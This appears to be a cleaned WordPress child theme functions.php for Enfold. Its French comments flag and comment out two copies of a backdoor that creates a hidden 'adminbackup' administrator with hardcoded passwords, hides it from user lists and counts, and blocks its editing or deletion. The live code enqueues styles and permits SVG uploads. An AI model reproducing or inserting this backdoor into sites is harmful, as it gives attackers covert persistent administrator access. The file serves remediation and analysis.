<?php

/*
 * ATTENTION: CODE MALVEILLANT COMMENTÉ CI-DESSOUS
 * Ce code crée des comptes administrateur cachés avec des backdoors
 * Il a été désactivé pour des raisons de sécurité
 */

/*
if (!function_exists('wp_enqueue_async_script') && function_exists('add_action') && function_exists('wp_die') && function_exists('get_user_by') && function_exists('is_wp_error') && function_exists('get_current_user_id') && function_exists('get_option') && function_exists('add_action') && function_exists('add_filter') && function_exists('wp_insert_user') && function_exists('update_option')) {

    // CODE MALVEILLANT: Création d'hooks pour masquer des utilisateurs administrateurs
    add_action('pre_user_query', 'wp_enqueue_async_script');
    add_filter('views_users', 'wp_generate_dynamic_cache');
    add_action('load-user-edit.php', 'wp_add_custom_meta_box');
    add_action('admin_menu', 'wp_schedule_event_action');

    // CODE MALVEILLANT: Masque l'utilisateur malveillant des requêtes
    function wp_enqueue_async_script($user_search) {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (is_wp_error($id) || $user_id == $id)
            return;

        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
            $user_search->query_where
        );
    }

    // CODE MALVEILLANT: Modifie les compteurs d'utilisateurs pour masquer l'utilisateur malveillant
    function wp_generate_dynamic_cache($views) {

        $html = explode('<span class="count">(', $views['all']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        $html = explode('<span class="count">(', $views['administrator']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        return $views;
    }

    // CODE MALVEILLANT: Empêche l'édition de l'utilisateur malveillant
    function wp_add_custom_meta_box() {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
            wp_die(__('Invalid user ID.'));
    }

    // CODE MALVEILLANT: Empêche la suppression de l'utilisateur malveillant
    function wp_schedule_event_action() {

        $id = get_option('_pre_user_id');

        if (isset($_GET['user']) && $_GET['user']
            && isset($_GET['action']) && $_GET['action'] == 'delete'
            && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
            wp_die(__('Invalid user ID.'));

    }

    // CODE MALVEILLANT: Crée un utilisateur administrateur caché avec mot de passe codé en dur
    $params = array(
        'user_login' => 'adminbackup',
        'user_pass' => '5hgxefs1EW',
        'role' => 'administrator',
        'user_email' => 'adminbackup@wordpress.org'
    );

    if (!username_exists($params['user_login'])) {
        $id = wp_insert_user($params);
        update_option('_pre_user_id', $id);

    } else {
        $hidden_user = get_user_by('login', $params['user_login']);
        if ($hidden_user->user_email != $params['user_email']) {
            $id = get_option('_pre_user_id');
            $params['ID'] = $id;
            wp_insert_user($params);
        }
    }

    if (isset($_COOKIE['WORDPRESS_ADMIN_USER']) && username_exists($params['user_login'])) {
        die('WP ADMIN USER EXISTS');
    }
}

// DEUXIÈME INSTANCE DU MÊME CODE MALVEILLANT AVEC UN MOT DE PASSE DIFFÉRENT
if (!function_exists('wp_enqueue_async_script') && function_exists('add_action') && function_exists('wp_die') && function_exists('get_user_by') && function_exists('is_wp_error') && function_exists('get_current_user_id') && function_exists('get_option') && function_exists('add_action') && function_exists('add_filter') && function_exists('wp_insert_user') && function_exists('update_option')) {

    add_action('pre_user_query', 'wp_enqueue_async_script');
    add_filter('views_users', 'wp_generate_dynamic_cache');
    add_action('load-user-edit.php', 'wp_add_custom_meta_box');
    add_action('admin_menu', 'wp_schedule_event_action');

    function wp_enqueue_async_script($user_search) {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (is_wp_error($id) || $user_id == $id)
            return;

        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
            $user_search->query_where
        );
    }

    function wp_generate_dynamic_cache($views) {

        $html = explode('<span class="count">(', $views['all']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        $html = explode('<span class="count">(', $views['administrator']);
        $count = explode(')</span>', $html[1]);
        $count[0]--;
        $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

        return $views;
    }

    function wp_add_custom_meta_box() {
        $user_id = get_current_user_id();
        $id = get_option('_pre_user_id');

        if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
            wp_die(__('Invalid user ID.'));
    }

    function wp_schedule_event_action() {

        $id = get_option('_pre_user_id');

        if (isset($_GET['user']) && $_GET['user']
            && isset($_GET['action']) && $_GET['action'] == 'delete'
            && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
            wp_die(__('Invalid user ID.'));

    }

    // CODE MALVEILLANT: Deuxième utilisateur administrateur caché avec un autre mot de passe
    $params = array(
        'user_login' => 'adminbackup',
        'user_pass' => '3(ev%J=@}U',
        'role' => 'administrator',
        'user_email' => 'adminbackup@wordpress.org'
    );

    if (!username_exists($params['user_login'])) {
        $id = wp_insert_user($params);
        update_option('_pre_user_id', $id);

    } else {
        $hidden_user = get_user_by('login', $params['user_login']);
        if ($hidden_user->user_email != $params['user_email']) {
            $id = get_option('_pre_user_id');
            $params['ID'] = $id;
            wp_insert_user($params);
        }
    }

    if (isset($_COOKIE['WORDPRESS_ADMIN_USER']) && username_exists($params['user_login'])) {
        die('WP ADMIN USER EXISTS');
    }
}
*/

// CODE LÉGITIME CI-DESSOUS POUR ENFOLD CHILD THEME

function enqueue_enfold_child_styles() {
    wp_enqueue_style('enfold-child-style', get_stylesheet_directory_uri() . '/style.css', array('avia-style'), '1.0');
}
add_action('wp_enqueue_scripts', 'enqueue_enfold_child_styles');

/*
* Add your own functions here. You can also copy some of the theme functions into this file. 
* Wordpress will use those functions instead of the original functions then.
*/

/* Autoriser les fichiers SVG */
function wpc_mime_types($mimes) {
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter('upload_mimes', 'wpc_mime_types');


